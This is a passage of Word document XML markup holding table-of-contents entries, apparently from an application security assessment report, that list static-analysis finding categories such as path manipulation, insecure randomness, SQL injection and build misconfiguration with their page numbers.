        <w:p w14:paraId="10BC9786" w14:textId="42021FC6" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039292" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.8.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Denial of Service: StringBuilder</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039292 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2E0DBAC2" w14:textId="6BEDEF9E" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039293" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.9.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Insecure Randomness</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039293 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>23</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5FC27E77" w14:textId="7055160D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039294" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.10.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Missing Check against Null</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039294 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>24</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="437A7AD7" w14:textId="0654CA19" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039295" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.11.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Password Management: Password in Comment</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039295 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4CC75B41" w14:textId="41AF6AAE" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039296" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.12.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039296 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>25</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="17049B97" w14:textId="0A106192" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039297" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.13.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Path Manipulation: Zip Entry Overwrite</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039297 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>26</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="26D1B491" w14:textId="5446E225" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039298" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.14.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Privacy Violation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039298 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>29</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5608E7CE" w14:textId="586E965B" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039299" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.15.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Resource Injection</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039299 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2EB1AE77" w14:textId="36439E1A" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039300" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.16.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039300 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="717EE2E5" w14:textId="792DF259" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039301" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.17.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak: Internal</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039301 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2BD358F7" w14:textId="0BE85AFC" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039302" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.18.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Weak Cryptographic Hash</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039302 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6608B340" w14:textId="6AAB021E" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039303" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.3.19.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SQL-injections</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039303 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="76D18EF0" w14:textId="71D325C4" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039304" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Security Fix</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039304 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="60659495" w14:textId="77F658C4" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039306" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.1.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
            </w:r>
